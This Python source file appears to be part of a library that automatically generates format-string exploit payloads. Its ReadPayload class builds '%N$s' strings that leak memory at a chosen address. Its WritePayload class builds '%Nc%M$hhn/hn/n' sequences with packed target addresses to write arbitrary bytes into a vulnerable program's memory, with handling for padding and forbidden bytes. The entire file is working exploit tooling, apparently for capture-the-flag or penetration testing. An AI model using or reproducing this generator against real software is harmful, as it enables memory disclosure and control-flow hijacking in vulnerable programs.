#!/usr/bin/env python3
import math
import operator
import struct
from formatstring.architectures import struct_fmt, local_arch


def unpack_bytes(arch, value):
    if isinstance(value, list):
        value = bytes(value)

    assert isinstance(value, bytes)
    return struct.unpack(arch.endian_fmt + struct_fmt(len(value), False),
                         value)[0]


class ForbiddenByteException(Exception):
    def __init__(self, byte):
        super().__init__('generated payload contains the forbidden '
                         'byte 0x%x' % byte)


class PayloadSettings:
    def __init__(self, offset, padding=0, arch=None,
                 forbidden_bytes=b'', padding_byte=None):
        '''
        Args:
            offset (int): The offset of your buffer
            padding (int): The needed padding
            arch (Architecture): The architecture
            forbidden_bytes (bytes): Bytes to avoid
            padding byte (bytes): The byte used for padding
        '''
        self.offset = offset
        self.padding = padding
        self.arch = arch or local_arch()
        self.forbidden_bytes = forbidden_bytes

        if padding_byte and padding_byte not in self.forbidden_bytes:
            self.padding_byte = padding_byte
        elif b'\x00' not in self.forbidden_bytes:
            self.padding_byte = b'\x00'
        else:
            for c in range(0xff, -1, -1):
                byte = bytes([c])
                if byte not in self.forbidden_bytes:
                    self.padding_byte = byte
                    break

    def contains_forbidden_byte(self, payload):
        return any(byte in payload for byte in self.forbidden_bytes)

    def check_forbidden_bytes(self, payload):
        if self.contains_forbidden_byte(payload):
            byte = next(filter(lambda b: b in payload,
                               self.forbidden_bytes))
            raise ForbiddenByteException(byte)


class ReadPayload:
    '''
    Read a null-terminated string at `address`
    '''

    def __init__(self, address):
        assert isinstance(address, int)
        self.address = address

    def generate(self, settings, start_len=0):
        '''
        Generate a format string to read at `address`

        Args:
            settings (PayloadSettings): Settings for the payload
            start_len (int): The length of already printed data

        Returns:
            The payload to read at `address`
        '''
        offset = settings.offset
        offset += math.ceil((max(0, start_len - settings.padding) +
                             len('%99999$s')) / settings.arch.bytes)

        payload = b'%' + str(offset).encode('ascii') + b'$s'

        padding = (settings.padding - start_len - len(payload) +
                   settings.arch.bytes * (offset - settings.offset))
        assert padding >= 0, 'bad padding'
        payload += settings.padding_byte * padding

        payload += struct.pack(settings.arch.address_fmt, self.address)
        settings.check_forbidden_bytes(payload)
        return payload


class WritePayload:
    '''
    Write in memory
    '''

    _write_specifier = {1: b'hhn', 2: b'hn', 4: b'n'}

    def __init__(self):
        self.memory = {}

    def __setitem__(self, address, value):
        assert isinstance(address, int)
        assert isinstance(value, bytes)

        for i, byte in enumerate(value):
            self.memory[address + i] = byte

    def _generate_writes(self, settings):
        '''
        Generate a list of write operations to perform
        '''
        writes = []
        addresses = sorted(self.memory.keys())

        i = 0
        while i < len(addresses):
            addr = addresses[i]
            packed_addr = struct.pack(settings.arch.address_fmt, addr)

            if settings.contains_forbidden_byte(packed_addr):
                # forbidden byte in address, try to write at addr - 1

                packed_addr_1 = struct.pack(settings.arch.address_fmt,
                                            addr - 1)
                if settings.contains_forbidden_byte(packed_addr_1):
                    byte = next(filter(lambda b: b in packed_addr,
                                       settings.forbidden_bytes))
                    raise ForbiddenByteException(byte)

                byte0 = self.memory.get(addr - 1, 0)

                if all(addr + j in self.memory for j in range(3)):
                    value = unpack_bytes(settings.arch,
                                         [byte0,
                                          self.memory[addr],
                                          self.memory[addr + 1],
                                          self.memory[addr + 2]])
                    if value <= 0xffff: # write 4 bytes
                        writes.append((addr - 1, value, 4))
                        i += 3
                        continue

                # write 2 bytes
                writes.append((addr - 1,
                               unpack_bytes(settings.arch,
                                            [byte0, self.memory[addr]]),
                               2))
                i += 1
            else:
                if all(addr + j in self.memory for j in range(4)):
                    value = unpack_bytes(settings.arch,
                                         [self.memory[addr],
                                          self.memory[addr + 1],
                                          self.memory[addr + 2],
                                          self.memory[addr + 3]])
                    if value <= 0xffff: # write 4 bytes
                        writes.append((addr, value, 4))
                        i += 4
                        continue

                if addr + 1 in self.memory: # write 2 bytes
                    writes.append((addr,
                                   unpack_bytes(settings.arch,
                                                [self.memory[addr],
                                                 self.memory[addr + 1]]),
                                   2))
                    i += 2
                else: # write 1 byte
                    writes.append((addr,
                                   unpack_bytes(settings.arch,
                                                [self.memory[addr]]),
                                   1))
                    i += 1

        return writes

    def _generate_offset(self, writes, settings, start_len):
        start_offset = 1000000
        last_start_offset = None

        # refine start offset
        while last_start_offset is None or start_offset < last_start_offset:
            offset = start_offset
            last_start_offset = start_offset

            payload_len = 0
            current_value = start_len
            for addr, value, size in writes:
                print_len = value - current_value
                current_value = value

                if print_len > 2:
                    payload_len += len('%%%dc' % print_len)
                else:
                    payload_len += print_len

                payload_len += len('%%%d$' % offset)
                payload_len += len(self._write_specifier[size])
                offset += 1

            start_offset = settings.offset
            start_offset += math.ceil((max(0, start_len - settings.padding) +
                                       payload_len) / settings.arch.bytes)

        return start_offset

    def generate(self, settings, start_len=0):
        assert self.memory, 'empty payload'

        # generate write operations
        writes = self._generate_writes(settings)

        # sort them by value
        writes.sort(key=operator.itemgetter(1))

        assert start_len <= writes[0][1], 'start length too big'

        # compute the offset
        start_offset = self._generate_offset(writes, settings, start_len)

        # generate the payload
        payload = b''
        addresses = b''
        current_value = start_len
        offset = start_offset
        for addr, value, size in writes:
            print_len = value - current_value
            current_value = value

            if print_len > 2:
                payload += b'%' + str(print_len).encode('ascii') + b'c'
            else:
                payload += b'A' * print_len

            payload += b'%' + str(offset).encode('ascii')
            payload += b'$' + self._write_specifier[size]
            addresses += struct.pack(settings.arch.address_fmt, addr)
            offset += 1

        padding = (settings.padding - start_len - len(payload) +
                   settings.arch.bytes * (start_offset - settings.offset))
        assert padding >= 0, 'bad padding'
        payload += settings.padding_byte * padding

        payload += addresses
        settings.check_forbidden_bytes(payload)
        return payload
